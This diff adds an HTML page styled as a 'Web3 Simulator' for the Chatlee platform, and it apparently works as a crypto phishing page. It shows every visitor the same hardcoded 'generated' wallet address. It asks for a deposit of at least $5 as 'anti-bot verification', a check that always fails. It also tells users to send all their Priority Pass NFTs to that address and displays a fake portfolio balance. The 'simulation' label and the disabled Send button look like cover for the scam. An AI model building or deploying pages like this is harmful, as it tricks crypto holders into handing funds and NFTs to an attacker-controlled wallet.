@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web3 Simulation – Dark Green Theme</title>
+
+<!-- FAVICON -->
+<link rel="icon" href="/icon.png">
+
+<style>
+/* ================= BASE STYLES ================= */
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+    background:linear-gradient(135deg,#061a12 0%,#030f0a 100%);
+    color:#e8fff4;
+    line-height:1.6;
+    min-height:100vh;
+    padding:20px;
+    background-attachment:fixed;
+}
+
+/* ================= HEADER ================= */
+.header-container{max-width:1200px;margin:0 auto;padding:20px 0}
+.header-card{
+    max-width:1000px;margin:0 auto 30px;padding:25px;
+    border-radius:20px;background:linear-gradient(145deg,#0d2b1f,#081c14);
+    border:1px solid rgba(0,255,157,.25);
+    box-shadow:0 10px 30px rgba(0,0,0,.3);
+    display:flex;justify-content:space-between;align-items:center;
+    position:relative;overflow:hidden;
+}
+.header-card::before{
+    content:'';position:absolute;top:-50%;left:-50%;
+    width:200%;height:200%;
+    background:radial-gradient(circle,rgba(0,255,157,.1) 0%,transparent 70%);
+    z-index:0;
+}
+.header-left{position:relative;z-index:1}
+.header-left h1{
+    color:#00ff9d;margin:0 0 8px 0;
+    font-size:2.2rem;font-weight:700;letter-spacing:.5px;
+    text-shadow:0 0 10px rgba(0,255,157,.3);
+}
+.header-left p{color:#8fbfa7;margin:0;font-size:1rem;font-weight:300}
+
+/* ================= BUTTONS ================= */
+.btn{
+    background:linear-gradient(180deg,#052e1d,#031f14);
+    color:#5CFFB2;border:1px solid rgba(92,255,178,.4);
+    padding:12px 24px;border-radius:12px;cursor:pointer;
+    position:relative;font-weight:600;font-size:1rem;
+    transition:all .3s ease;box-shadow:0 4px 15px rgba(0,0,0,.2);
+    z-index:1;overflow:hidden;
+}
+.btn::before{
+    content:'';position:absolute;top:0;left:0;
+    width:0;height:100%;background:linear-gradient(90deg,rgba(0,255,157,.2),transparent);
+    transition:width .5s ease;z-index:-1;
+}
+.btn:hover{
+    transform:translateY(-2px);
+    box-shadow:0 6px 20px rgba(0,255,157,.3);
+    border-color:rgba(92,255,178,.7);
+}
+.btn:hover::before{width:100%}
+.btn:active{transform:translateY(0)}
+.btn.loading{pointer-events:none;opacity:.7}
+.btn.loading::after{
+    content:"";width:18px;height:18px;
+    border:3px solid #5CFFB2;border-top:3px solid transparent;
+    border-radius:50%;position:absolute;right:15px;top:50%;
+    transform:translateY(-50%);animation:spin .7s linear infinite;
+}
+@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
+
+/* small button – for Copy / View Wallet */
+.btn-sm{
+    padding:6px 12px;font-size:.85rem;margin-left:8px;
+}
+
+/* ================= LAYOUT ================= */
+.wrapper{max-width:800px;margin:0 auto;padding:0 20px}
+
+/* ================= CARD ================= */
+.card{
+    background:linear-gradient(145deg,#0d2b1f,#081c14);
+    padding:25px;border-radius:20px;
+    border:1px solid rgba(0,255,157,.2);
+    margin-bottom:25px;transition:all .4s ease;
+    box-shadow:0 8px 25px rgba(0,0,0,.25);
+    position:relative;overflow:hidden;
+}
+.card::before{
+    content:'';position:absolute;top:0;left:0;
+    width:5px;height:100%;
+    background:linear-gradient(to bottom,#00ff9d,#00cc7a);
+    border-radius:0 5px 5px 0;opacity:0;
+    transition:opacity .3s ease;
+}
+.card.active{opacity:1;border:1px solid #00ff9d;box-shadow:0 0 20px rgba(0,255,157,.2)}
+.card.active::before{opacity:1}
+.card.inactive{opacity:.4;filter:grayscale(50%)}
+.card.inactive .btn{pointer-events:none}
+.card h3{
+    color:#5CFFB2;margin-bottom:20px;font-size:1.4rem;
+    display:flex;align-items:center;gap:10px;
+}
+.card h3::before{
+    content:'';display:block;width:12px;height:12px;
+    border-radius:50%;background:#00ff9d;
+    box-shadow:0 0 8px #00ff9d;
+}
+
+/* ================= INPUT FIELD ================= */
+.input-field{
+    width:100%;padding:10px;margin:10px 0;
+    border:1px solid rgba(0,255,157,.4);
+    border-radius:8px;background:rgba(0,0,0,.2);
+    color:#e8fff4;font-size:1rem;outline:none;
+    transition:border-color .3s ease;
+}
+.input-field:focus{border-color:#00ff9d}
+
+/* ================= TEXT (messages) ================= */
+.success,.failed,.loading-text{
+    margin-top:15px;padding:10px;
+    border-left:3px solid;display:flex;align-items:center;gap:10px;
+}
+.success{color:#5CFFB2;background:rgba(92,255,178,.1);border-color:#5CFFB2}
+.success::before{content:"✓";font-weight:bold}
+.failed{color:#ff4d4d;background:rgba(255,77,77,.1);border-color:#ff4d4d}
+.failed::before{content:"✗";font-weight:bold}
+.loading-text{color:#00ff9d;background:rgba(0,255,157,.1);border-color:#00ff9d}
+.loading-text::before{
+    content:"";display:inline-block;width:12px;height:12px;
+    border:2px solid #00ff9d;border-top:2px solid transparent;
+    border-radius:50%;animation:spin 1s linear infinite;
+}
+
+/* hide element (used for messages that start hidden) */
+.hidden{display:none!important}
+
+/* ================= ADDRESS BOX ================= */
+.address-box{
+    margin-top:15px;padding:15px;
+    background:rgba(2,17,12,.7);
+    border-radius:12px;font-size:.9rem;word-break:break-all;
+    border:1px solid rgba(0,255,157,.1);
+    position:relative;padding-left:40px;
+    display:flex;align-items:center;justify-content:space-between;
+}
+.address-box::before{
+    content:'🔑';position:absolute;left:15px;top:50%;
+    transform:translateY(-50%);
+}
+
+/* ================= WALLET BUTTON ================= */
+.wallet-btn{display:none;margin-top:15px}
+
+/* ================= WALLET MODAL ================= */
+.wallet-modal{
+    position:fixed;inset:0;background:rgba(0,0,0,.85);
+    backdrop-filter:blur(10px);display:flex;
+    justify-content:center;align-items:center;
+    opacity:0;pointer-events:none;transition:opacity .4s ease;
+    z-index:1000;
+}
+.wallet-modal.active{opacity:1;pointer-events:all}
+.wallet-box{
+    width:90%;max-width:400px;
+    background:linear-gradient(145deg,#0d2b1f,#081c14);
+    padding:30px;border-radius:20px;
+    border:1px solid #00ff9d;
+    box-shadow:0 0 40px rgba(0,255,157,.3);
+    position:relative;overflow:hidden;
+}
+.wallet-box::before{
+    content:'';position:absolute;top:-50%;left:-50%;
+    width:200%;height:200%;
+    background:radial-gradient(circle,rgba(0,255,157,.05) 0%,transparent 70%);
+    z-index:0;
+}
+.wallet-box > *{position:relative;z-index:1}
+.wallet-box h3{
+    color:#00ff9d;margin:0 0 20px 0;
+    text-align:center;font-size:1.8rem;
+    text-shadow:0 0 10px rgba(0,255,157,.3);
+}
+.total{color:#8fbfa7;font-size:1rem;text-align:center;margin-bottom:5px}
+.total-value{
+    font-size:2rem;text-align:center;margin-bottom:20px;
+    color:#5CFFB2;font-weight:700;
+    text-shadow:0 0 10px rgba(92,255,178,.3);
+}
+.wallet-actions{display:flex;gap:15px;margin-bottom:25px}
+.wallet-actions .btn{flex:1;padding:12px}
+.asset{
+    display:flex;justify-content:space-between;align-items:center;
+    padding:12px 15px;margin-bottom:10px;
+    background:rgba(0,0,0,.2);border-radius:12px;
+    transition:all .3s ease;
+}
+.asset:hover{background:rgba(0,255,157,.1);transform:translateX(5px)}
+.asset-left{display:flex;align-items:center;gap:12px}
+.asset img{
+    width:30px;height:30px;border-radius:50%;
+    border:1px solid rgba(0,255,157,.3);
+}
+.asset-name{font-weight:500}
+.asset-value{font-weight:600;color:#5CFFB2}
+.close-wallet{width:100%;margin-top:15px}
+
+/* ================= NOTIFICATION MODAL (custom pop‑up) ================= */
+.notification-modal{
+    position:fixed;inset:0;
+    background:rgba(0,0,0,.6);
+    backdrop-filter:blur(5px);
+    display:flex;justify-content:center;align-items:center;
+    opacity:0;pointer-events:none;
+    transition:opacity .3s ease;
+    z-index:2000;
+}
+.notification-modal.active{
+    opacity:1;pointer-events:all;
+}
+.notification-box{
+    background:linear-gradient(145deg,#0d2b1f,#081c14);
+    padding:20px 30px;
+    border-radius:12px;
+    border:1px solid #00ff9d;
+    box-shadow:0 0 30px rgba(0,255,157,.4);
+    color:#e8fff4;
+    text-align:center;
+    max-width:80%;
+}
+.notification-box p{margin:0;font-size:1rem}
+
+/* ================= FOOTER ================= */
+.footer{
+    max-width:1200px;margin:40px auto 20px;
+    text-align:center;color:#8fbfa7;font-size:.9rem;
+    padding:0 20px;
+}
+.footer a{
+    color:#e8fff4;text-decoration:none;margin:0 6px;
+    display:inline-flex;align-items:center;
+}
+.footer a img{width:16px;height:16px;margin-right:4px}
+
+/* ================= ANIMATIONS ================= */
+@keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(0,255,157,.4);}
+    70%{box-shadow:0 0 0 10px rgba(0,255,157,0);}
+    100%{box-shadow:0 0 0 0 rgba(0,255,157,0);}
+}
+.pulse{animation:pulse 2s infinite}
+
+/* ================= RESPONSIVE ================= */
+@media(max-width:768px){
+    body{padding:15px}
+    .header-card{flex-direction:column;gap:20px;text-align:center;padding:20px}
+    .header-left h1{font-size:1.8rem}
+    .header-left p{font-size:.9rem}
+    .wrapper{padding:0 15px}
+    .card{padding:20px}
+    .card h3{font-size:1.2rem}
+    .btn{padding:10px 20px;font-size:.9rem}
+    .wallet-box{padding:20px}
+    .wallet-actions{flex-direction:column;gap:10px}
+    .wallet-actions .btn{width:100%}
+}
+@media(max-width:480px){
+    .header-card{padding:15px}
+    .header-left h1{font-size:1.5rem}
+    .card{padding:15px}
+    .card h3{font-size:1.1rem}
+    .btn{padding:8px 16px;font-size:.85rem}
+    .address-box{font-size:.8rem;padding:12px 12px 12px 35px}
+    .address-box::before{left:12px;font-size:.9rem}
+}
+
+/* ================= SCROLLBAR ================= */
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:#030f0a}
+::-webkit-scrollbar-thumb{
+    background:#00ff9d;border-radius:4px
+}
+::-webkit-scrollbar-thumb:hover{background:#5CFFB2}
+</style>
+</head>
+
+<body>
+    <!-- ================= HEADER ================= -->
+    <div class="header-container">
+        <div class="header-card">
+            <div class="header-left">
+                <h1>Web3 Simulator</h1>
+                <p>Experience simulated blockchain verification workflow</p>
+            </div>
+
+            <div>
+                <button id="startBtn" class="btn pulse" onclick="start(this)">
+                    Start Verification
+                </button>
+
+                <button id="openWalletBtn" class="btn wallet-btn" onclick="openWallet()">
+                    OPEN WALLET
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= CONTENT ================= -->
+    <div class="wrapper">
+
+        <!-- 1️⃣ YOUR CHATLEE USERNAME -->
+        <div id="step0" class="card inactive">
+            <h3>1. Your Chatlee Username</h3>
+            <p>Please enter your Chatlee username. All your Priority Pass NFTs will appear in the Inventory tab on the Chatlee platform once your account is connected to your wallet.</p>
+
+            <input type="text" id="usernameInput" class="input-field" placeholder="Enter your Chatlee username" disabled>
+
+            <button id="usernameVerifyBtn" class="btn" onclick="verifyUsername(this)" disabled>
+                Verify
+            </button>
+
+            <div id="usernameSuccess" class="success hidden">
+                Username verified!
+            </div>
+        </div>
+
+        <!-- 2️⃣ CREATE YOUR CHATLEE WALLET -->
+        <div id="step1" class="card inactive">
+            <h3>2. Create Your Chatlee Wallet</h3>
+            <p>This Chatlee wallet will also be used for the Chatlee Airdrop and will be directly linked to your account.</p>
+
+            <button id="walletBtn" class="btn" onclick="createWallet(this)">
+                Generate Wallet
+            </button>
+
+            <div id="walletLoading" class="loading-text hidden">
+                Generating secure wallet...
+            </div>
+
+            <div id="walletSuccess" class="success hidden">
+                <span>Wallet successfully generated!</span>
+                <button id="viewWalletBtn" class="btn btn-sm hidden" onclick="openWallet()">View Wallet</button>
+            </div>
+
+            <div id="walletAddressBox" class="address-box hidden">
+                <span id="walletAddress">0xeB418A6cF4642d184c09C4389bc535CFE6Cdb739</span>
+                <button id="copyAddressBtn" class="btn btn-sm" onclick="copyAddress()">Copy</button>
+            </div>
+        </div>
+
+        <!-- 3️⃣ ONCHAIN DEPOSIT VERIFICATION -->
+        <div id="step2" class="card inactive">
+            <h3>3. Onchain Deposit Verification</h3>
+            <p>Please make a deposit of at least $5 for the verification process. This is to ensure anti‑bot and sybil protection. The funds can be withdrawn again after the verification is completed.</p>
+
+            <button class="btn" onclick="verifyDeposit(this)">Verify Deposit</button>
+
+            <div id="fail2" class="failed hidden">
+                Verification failed! Please check your balance.
+            </div>
+        </div>
+
+        <!-- 4️⃣ MIGRATE PRIORITY PASS -->
+        <div id="step3" class="card inactive">
+            <h3>4. Migrate Your Priority Pass to Your Chatlee Wallet</h3>
+            <p>Send all your Priority Pass NFTs to your Chatlee wallet. Once the verification is complete, the NFTs will appear in the Inventory tab in your Chatlee account.</p>
+
+            <button class="btn" onclick="verifyNFT(this)">Migrate NFTs</button>
+
+            <div id="migrationSuccess" class="success hidden">
+                NFTs successfully migrated!
+            </div>
+
+            <div id="fail3" class="failed hidden">
+                Migration failed! Token not found in registry.
+            </div>
+        </div>
+
+        <!-- 5️⃣ CHECK YOUR REWARD -->
+        <div id="step4" class="card inactive">
+            <h3>5. Check Your Reward</h3>
+            <p>Every wallet that holds a Priority Pass NFT is eligible to receive rewards.</p>
+
+            <button class="btn" onclick="checkReward(this)">Check Reward</button>
+
+            <div id="rewardSuccess" class="success hidden">
+                Congratulations! You have a reward waiting.
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= WALLET MODAL ================= -->
+    <div id="walletModal" class="wallet-modal">
+        <div class="wallet-box">
+            <h3>Your Wallet</h3>
+
+            <div class="total">Total Portfolio Value</div>
+            <div class="total-value">$1,247.82</div>
+
+            <div class="wallet-actions">
+                <button class="btn" onclick="send()">Send</button>
+                <button class="btn" onclick="receive()">Receive</button>
+            </div>
+
+            <div class="asset">
+                <div class="asset-left">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwRkY5RCI+PHBhdGggZD0iTTEyIDI0QzUuMzczIDI0IDAgMTguNjI3IDAgMTJTNi4zNzMgMCAxMiAwYzYuNjI4IDAgMTIgNS4zNzMgMTIgMTItNi4wNDcgMTEuOTYtMTcuOTYgMTMuMDQtMTIgMHoiLz48L3N2Zz4=" alt="ETH">
+                    <span class="asset-name">ETH</span>
+                </div>
+                <div class="asset-value">$1,200.00</div>
+            </div>
+
+            <div class="asset">
+                <div class="asset-left">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwRkY5RCI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzAwRkY5RCIgc3Ryb2tlLXdpZHRoPSIyIi8+PHBhdGggZD0iTTggMTJoOG0wLTR2OG0tOC00djgiIHN0cm9rZT0iIzAwRkY5RCIgc3Ryb2tlLXdpZHRoPSIyIi8+PC9zdmc+" alt="USDT">
+                    <span class="asset-name">USDT</span>
+                </div>
+                <div class="asset-value">$45.23</div>
+            </div>
+
+            <div class="asset">
+                <div class="asset-left">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwRkY5RCI+PHBhdGggZD0iTTEyIDE4YzQuOTY1IDAgOS00LjAzNSA5LTlzLTQuMDM1LTktOS05LTkgNC4wMzUtOSA5IDQuMDM1IDkgOSA5eiIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMDBGRjlEIiBzdHJva2Utd2lkdGg9IjIiLz48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSI0IiBmaWxsPSJub25lIiBzdHJva2U9IiMwMEZGOUQiIHN0cm9rZS13aWR0aD0iMiIvPjwvc3ZnPg==" alt="USDC">
+                    <span class="asset-name">USDC</span>
+                </div>
+                <div class="asset-value">$2.59</div>
+            </div>
+
+            <div class="asset">
+                <div class="asset-left">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwRkY5RCI+PHBhdGggZD0iTTEyIDE4YzQuOTY1IDAgOS00LjAzNSA5LTlzLTQuMDM1LTktOS05LTkgNC4wMzUtOSA5IDQuMDM1IDkgOSA5eiIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMDBGRjlEIiBzdHJva2Utd2lkdGg9IjIiLz48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSI0IiBmaWxsPSJub25lIiBzdHJva2U9IiMwMEZGOUQiIHN0cm9rZS13aWR0aD0iMiIvPjwvc3ZnPg==" alt="Chatlee">
+                    <span class="asset-name">Chatlee</span>
+                </div>
+                <div class="asset-value">$0.00</div>
+            </div>
+
+            <button class="btn close-wallet" onclick="closeWallet()">
+                Close Wallet
+            </button>
+        </div>
+    </div>
+
+    <!-- ================= NOTIFICATION MODAL ================= -->
+    <div id="notificationModal" class="notification-modal">
+        <div class="notification-box">
+            <p id="notificationMessage"></p>
+        </div>
+    </div>
+
+    <!-- ================= FOOTER ================= -->
+    <div class="footer">
+        Powered by: <strong>Neocities</strong> |
+        <a href="https://chatlee.io" target="_blank"><img src="/web.png" alt="Web">Website</a> |
+        <a href="https://x.com/chatlee_io" target="_blank"><img src="/x.png" alt="X">X</a> |
+        <a href="https://t.me/chatlee_io" target="_blank"><img src="/tg.webp" alt="Telegram">Telegram</a>
+    </div>
+
+<script>
+/* ---------- GLOBAL STATE ---------- */
+let appState = {
+    startClicked: false,
+    usernameVerified: false,
+    walletGenerated: false,
+    walletAddress: ''
+};
+
+/* ---------- Persist / Restore ---------- */
+function persistState(){
+    const data = {
+        ...appState,
+        timestamp: Date.now()
+    };
+    localStorage.setItem('web3SimState', JSON.stringify(data));
+}
+function restoreState(){
+    const raw = localStorage.getItem('web3SimState');
+    if(!raw) return;
+    const saved = JSON.parse(raw);
+    if(Date.now() - saved.timestamp > 10*60*1000){   // >10 min old → discard
+        localStorage.removeItem('web3SimState');
+        return;
+    }
+    // apply saved values
+    appState = {
+        startClicked: saved.startClicked,
+        usernameVerified: saved.usernameVerified,
+        walletGenerated: saved.walletGenerated,
+        walletAddress: saved.walletAddress || ''
+    };
+
+    /* ----- Re‑build UI from saved state ----- */
+    if(appState.startClicked){
+        document.getElementById('startBtn').style.display='none';
+        const step0 = document.getElementById('step0');
+        step0.classList.remove('inactive'); step0.classList.add('active');
+
+        if(appState.usernameVerified){
+            document.getElementById('usernameInput').disabled = true;
+            document.getElementById('usernameVerifyBtn').style.display='none';
+            document.getElementById('usernameSuccess').classList.remove('hidden');
+
+            // unlock wallet step
+            const step1 = document.getElementById('step1');
+            step1.classList.remove('inactive'); step1.classList.add('active');
+        }else{
+            document.getElementById('usernameInput').disabled = false;
+            document.getElementById('usernameVerifyBtn').disabled = false;
+        }
+    }
+
+    if(appState.walletGenerated){
+        // hide generate button, show success + view‑wallet btn
+        document.getElementById('walletBtn').style.display='none';
+        document.getElementById('walletLoading').classList.add('hidden');
+        document.getElementById('walletSuccess').classList.remove('hidden');
+        document.getElementById('viewWalletBtn').classList.remove('hidden');
+
+        // address
+        document.getElementById('walletAddressBox').classList.remove('hidden');
+        document.getElementById('walletAddress').innerText = appState.walletAddress;
+
+        // header open‑wallet button
+        document.getElementById('openWalletBtn').style.display='inline-block';
+
+        // unlock deposit step
+        const step2 = document.getElementById('step2');
+        step2.classList.remove('inactive'); step2.classList.add('active');
+    }
+}
+
+/* ---------- Notification (custom pop‑up) ---------- */
+function showNotification(message){
+    const modal = document.getElementById('notificationModal');
+    const txt   = document.getElementById('notificationMessage');
+    txt.innerHTML = message.replace(/\n/g,'<br>');
+    modal.classList.add('active');
+    setTimeout(()=>{ modal.classList.remove('active'); },2000);
+}
+
+/* ---------- Utility ---------- */
+function setLoading(btn,state){
+    if(state) btn.classList.add('loading');
+    else btn.classList.remove('loading');
+}
+
+/* ---------- START ---------- */
+function start(btn){
+    setLoading(btn,true);
+    btn.classList.remove('pulse');
+
+    setTimeout(()=>{
+        setLoading(btn,false);
+        btn.style.display='none';
+        appState.startClicked = true;
+        persistState();
+
+        const step0 = document.getElementById('step0');
+        step0.classList.remove('inactive'); step0.classList.add('active');
+        document.getElementById('usernameInput').disabled = false;
+        document.getElementById('usernameVerifyBtn').disabled = false;
+    },3000);
+}
+
+/* ---------- Username verification ---------- */
+function verifyUsername(btn){
+    const input = document.getElementById('usernameInput');
+    const val   = input.value.trim();
+    if(val===''){
+        showNotification('Please enter a Chatlee username.');
+        return;
+    }
+    setLoading(btn,true);
+    setTimeout(()=>{
+        setLoading(btn,false);
+        btn.style.display='none';
+        input.disabled = true;
+        document.getElementById('usernameSuccess').classList.remove('hidden');
+
+        appState.usernameVerified = true;
+        persistState();
+
+        const step1 = document.getElementById('step1');
+        step1.classList.remove('inactive'); step1.classList.add('active');
+    },1000);
+}
+
+/* ---------- Wallet creation (always succeeds) ---------- */
+function createWallet(btn){
+    setLoading(btn,true);
+    document.getElementById('walletLoading').classList.remove('hidden');
+
+    const address = '0xeB418A6cF4642d184c09C4389bc535CFE6Cdb739';
+
+    setTimeout(()=>{
+        setLoading(btn,false);
+        btn.style.display='none';
+        document.getElementById('walletLoading').classList.add('hidden');
+
+        // success UI
+        document.getElementById('walletSuccess').classList.remove('hidden');
+        document.getElementById('viewWalletBtn').classList.remove('hidden');
+
+        document.getElementById('walletAddressBox').classList.remove('hidden');
+        document.getElementById('walletAddress').innerText = address;
+
+        appState.walletGenerated = true;
+        appState.walletAddress   = address;
+        persistState();
+
+        document.getElementById('openWalletBtn').style.display='inline-block';
+
+        // unlock deposit step
+        const step2 = document.getElementById('step2');
+        step2.classList.remove('inactive'); step2.classList.add('active');
+    },1500);
+}
+
+/* ---------- Copy wallet address (custom pop‑up) ---------- */
+function copyAddress(){
+    const address = appState.walletAddress || document.getElementById('walletAddress').innerText.trim();
+    navigator.clipboard.writeText(address)
+        .then(()=>showNotification('Wallet address copied to clipboard!'))
+        .catch(()=>{
+            const ta = document.createElement('textarea');
+            ta.value = address;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            showNotification('Wallet address copied to clipboard!');
+        });
+}
+
+/* ---------- Deposit verification (fails, blocks next step) ---------- */
+function verifyDeposit(btn){
+    setLoading(btn,true);
+    setTimeout(()=>{
+        setLoading(btn,false);
+        document.getElementById('fail2').classList.remove('hidden');
+        // keep next step blocked – do nothing else
+    },1200);
+}
+
+/* ---------- NFT migration (only reachable after a successful deposit) ---------- */
+function verifyNFT(btn){
+    setLoading(btn,true);
+    document.getElementById('fail3').classList.add('hidden');
+    document.getElementById('migrationSuccess').classList.add('hidden');
+
+    setTimeout(()=>{
+        setLoading(btn,false);
+        const success = Math.random() < 0.7;   // demo randomness
+        if(success){
+            document.getElementById('migrationSuccess').classList.remove('hidden');
+
+            // unlock final reward step
+            const step4 = document.getElementById('step4');
+            step4.classList.remove('inactive'); step4.classList.add('active');
+        }else{
+            document.getElementById('fail3').classList.remove('hidden');
+        }
+    },1200);
+}
+
+/* ---------- Reward checking ---------- */
+function checkReward(btn){
+    setLoading(btn,true);
+    setTimeout(()=>{
+        setLoading(btn,false);
+        document.getElementById('rewardSuccess').classList.remove('hidden');
+    },800);
+}
+
+/* ---------- Wallet modal ---------- */
+function openWallet(){
+    document.getElementById('walletModal').classList.add('active');
+}
+function closeWallet(){
+    document.getElementById('walletModal').classList.remove('active');
+}
+
+/* ---------- Receive (copy address) ---------- */
+function receive(){
+    const address = appState.walletAddress || document.getElementById('walletAddress').innerText.trim();
+    navigator.clipboard.writeText(address)
+        .then(()=>showNotification('Wallet address copied to clipboard!'))
+        .catch(()=>{
+            const ta = document.createElement('textarea');
+            ta.value = address;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            showNotification('Wallet address copied to clipboard!');
+        });
+}
+
+/* ---------- Send (disabled) ---------- */
+function send(){
+    showNotification('Transaction feature is disabled in this simulation.<br>Please use a real wallet application for actual transfers.');
+}
+
+/* ---------- Initialise page from saved state ---------- */
+document.addEventListener('DOMContentLoaded', restoreState);
+</script>
+</body>
+</html>
